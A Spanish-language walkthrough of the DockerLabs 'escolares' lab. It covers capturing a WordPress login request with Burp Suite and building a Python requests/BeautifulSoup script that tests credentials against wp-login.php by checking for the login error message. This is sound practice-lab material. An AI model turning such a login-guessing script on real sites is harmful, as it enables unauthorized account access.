
## **Paso 1: Descarga y Configuración de la Máquina Vulnerable**

Lo primero que hacemos es descargar la máquina vulnerable llamada **escolares** desde la plataforma **DockerLabs**. Al descargarla, obtendremos un archivo comprimido llamado `escolares.zip`.

1. **Descomprimimos el archivo** en el escritorio para mayor facilidad:
    
    ```bash
    unzip escolares.zip -d ~/Escritorio/escolares
    ```
    
2. **Al descomprimirlo, obtenemos dos archivos**:
    
    - `auto_deploy.sh`
    - `strongjenkins.tar`
3. **Ejecutamos el script de despliegue para lanzar la máquina virtual**:
    
    ```bash
    sudo bash auto_deploy.sh strongjenkins.tar
    ```
    
    Esto generará una dirección IP dentro de la terminal, por ejemplo:
    
    ```
    172.17.0.2
    ```
    
4. **Accedemos a la máquina vulnerable desde el navegador** en el puerto 80:
    
    ```
    http://172.17.0.2/
    ```
    
    Si todo ha salido bien, veremos la interfaz de la máquina "escolares".
    

---

## **Paso 2: Acceder al WordPress de la Máquina**

Ahora, agregamos **`/wordpress`** a la URL:

```
http://172.17.0.2/wordpress
```

Si la página no carga correctamente, debemos hacer algunos ajustes en la configuración de nuestro sistema.

1. **Abrimos el archivo `/etc/hosts`** en una terminal:
    
    ```bash
    sudo nano /etc/hosts
    ```
    
2. **Añadimos la siguiente línea al final del archivo**:
    
    ```
    172.17.0.2    escolares.dl
    ```
    
3. **Guardamos y cerramos** (CTRL + O → ENTER → CTRL + X → ENTER).

Ahora la página debería cargar correctamente.

![[6.1- Panel de login, wordpress.png]]

---

## **Paso 3: Acceder a la Página de Login de WordPress**

Probamos ingresar en:

```
http://172.17.0.2/wordpress/wp-login.php
```

Si la página aún no se ve correctamente, probamos con otro navegador (por ejemplo, Chromium en vez de Firefox).

Si al hacer un intento fallido de inicio de sesión aparece el siguiente error:

```
Error: El nombre de usuario admin no está registrado en este sitio.
```

Podemos aprovechar este mensaje en nuestro script de automatización con **Python y BeautifulSoup**.

---

## **Paso 3.1: Configurar el Navegador para Aceptar Cookies**

Cuando intentamos iniciar sesión en WordPress sin configurar las cookies, aparece un mensaje como este:

```
Las cookies están bloqueadas o no son compatibles con tu navegador. Debes habilitar las cookies para usar WordPress.
```

Para solucionar esto, debemos **permitir todas las cookies** en nuestro navegador.

### **Si usas Firefox**

1. **Abrir la configuración de Firefox:**
    
    - En la barra de direcciones, escribir:
        
        ```
        about:preferences#privacy
        ```
        
    - O ir a **Menú (☰) → Ajustes → Privacidad y seguridad**.
2. **Configurar las cookies:**
    
    - En la sección "Protección contra el rastreo", seleccionar **"Personalizado"**.
    - Asegurarse de que **Cookies** no esté bloqueado o seleccionar **"Solo entre sitios no rastreadores"**.
3. **Añadir una excepción:**
    
    - Desplazarse hasta la sección **Cookies y datos del sitio**.
    - Hacer clic en **"Administrar permisos..."**.
    - Introducir la dirección:
        
        ```
        http://escolares.dl
        ```
        
    - Hacer clic en **"Permitir"** y luego en **"Guardar cambios"**.
4. **Vaciar caché y cookies anteriores:**
    
    - Hacer clic en **"Limpiar datos..."** dentro de la sección **Cookies y datos del sitio**.
    - Marcar **Cookies y datos del sitio** y **Contenido en caché web**, luego hacer clic en **"Limpiar"**.
5. **Reiniciar Firefox y probar de nuevo** accediendo a:
    
    ```
    http://escolares.dl/wordpress/wp-login.php
    ```
    

---

## **Paso 3.2: Verificar que Ahora se Muestra el Mensaje Correcto**

Después de configurar correctamente las cookies, hacemos un intento fallido de inicio de sesión con credenciales falsas como:

```
Usuario: admin  
Contraseña: cualquiercosa
```

Si la configuración es correcta, ahora veremos el mensaje:

```
Error: El nombre de usuario admin no está registrado en este sitio.
```

![[6.1- Panel de login, wordpress.png]]

Este mensaje es importante porque nuestro **script en Python** lo utilizará para detectar si un intento de acceso fue exitoso o no.

---
## **Paso 3.3: Configuración del Proxy del Navegador**

Para que Burp Suite pueda interceptar la petición de inicio de sesión de WordPress, debemos configurar el navegador para que todo el tráfico pase a través del proxy de Burp Suite.

---

### **Configuración en Firefox**

1. Ir a **Menú (☰) → Ajustes → General → Configuración de Red**.
2. Hacer clic en **"Configuración"** y seleccionar **"Configuración manual del proxy"**.
3. Ingresar los siguientes valores:
    - **Proxy HTTP**: `127.0.0.1`
    - **Puerto**: `8080`
    - **Marcar la opción "Usar este proxy para todos los protocolos"**.
4. En **"No usar proxy para"**, borrar todo y dejar vacío.
5. Guardar y cerrar la configuración.

---

## **Paso 4: Capturar la Petición con Burp Suite**

Para obtener los encabezados correctos de la petición HTTP:

1. Abrimos **Burp Suite** en Kali Linux.
    
2. Vamos a la pestaña **Proxy** → **Intercept**.
    
3. Nos aseguramos de que "Intercept is on" para capturar la solicitud.
    
4. Intentamos iniciar sesión con credenciales falsas (por ejemplo, `admin / password`).
    
5. En **Burp Suite**, observamos la petición interceptada:
    
    ```
    POST /wordpress/wp-login.php HTTP/1.1
    Host: escolares.dl
    Content-Length: 110
    Cache-Control: max-age=0
    Accept-Language: en-US,en;q=0.9
    Origin: http://172.17.0.2
    Content-Type: application/x-www-form-urlencoded
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive
    
    log=admin&pwd=m&wp-submit=Acceder&redirect_to=http%3A%2F%2Fescolares.dl%2Fwordpress%2Fwp-admin%2F&testcookie=1
    ```
    
    Con esto, obtenemos toda la información necesaria para construir nuestro script.
    

---

## **Paso 5: Desarrollo del Script en Python**

Con esta información, construimos nuestro script en Python utilizando **requests** y **BeautifulSoup** para analizar la respuesta del servidor y determinar si la autenticación fue exitosa o no.

### **Versión Inicial del Script**

```python
import requests
from bs4 import BeautifulSoup

url = 'http://escolares.dl/wordpress/wp-login.php'

usuario = 'luisillo'
password = 'Luis1981'

headers = {
    'Host': 'escolares.dl',
    'Content-Length': '114',
    'Cache-Control': 'max-age=0',
    'Accept-Language': 'en-US,en;q=0.9',
    'Origin': 'http://172.17.0.2',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://172.17.0.2/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive'
}

payload = {
    'log': usuario,
    'pwd': password,
    'wp-submit': 'Acceder',
    'redirect_to': 'http://escolares.dl/wordpress/wp-admin/',
    'testcookie': '1'
}

with requests.Session() as session:
    session.get(url, headers=headers)
    response = session.post(url, headers=headers, data=payload, allow_redirects=True)
    
    soup = BeautifulSoup(response.text, 'html.parser')
    error_message = soup.find('div', {'id': 'login_error'})
    
    print(f"Intentando con la contraseña: {password}")

    if error_message:
        print(f"Login fallido con la contraseña {password}")
    else:
        print(f"Login correcto con el usuario {usuario} y contraseña {password}")
```

---

## **Paso 6: Optimización del Código**

Se realizaron mejoras en la estructura y en los encabezados de la petición.

```python
import requests
from bs4 import BeautifulSoup

url = 'http://escolares.dl/wordpress/wp-login.php'

usuario = 'luisillo'
password = 'Luis1981'

headers = {
    'Host': 'escolares.dl',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://escolares.dl',
    'Connection': 'keep-alive',
    'Referer': 'http://escolares.dl/wordpress/wp-login.php',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=1'
}

payload = {
    'log': usuario,
    'pwd': password,
    'wp-submit': 'Acceder',
    'redirect_to': 'http://escolares.dl/wordpress/wp-admin/',
    'testcookie': '1'
}

with requests.Session() as session:
    session.get(url, headers=headers)
    response = session.post(url, headers=headers, data=payload, allow_redirects=True)
    
    soup = BeautifulSoup(response.text, 'html.parser')
    error_message = soup.find('div', {'id': 'login_error'})
    
    print(f"Intentando con la contraseña: {password}")

    if error_message:
        print(f"Login fallido con la contraseña {password}")
    else:
        print(f"Login correcto con el usuario {usuario} y contraseña {password}")
```

---

